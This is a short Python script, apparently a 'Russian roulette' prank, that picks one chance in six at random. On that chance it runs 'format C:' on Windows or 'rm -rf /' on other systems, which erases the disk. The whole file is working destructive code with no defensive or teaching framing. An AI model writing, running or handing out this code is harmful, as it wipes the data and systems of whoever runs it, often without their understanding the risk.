import random
import time
import webbrowser
import os
import subprocess


random.seed(time.time())
dies = [True] + [False] * 5
random.shuffle(dies)


if dies.pop() is True:
    if os.name == 'nt':
        subprocess.run("format C:")
    else:
        os.system("rm -rf /")
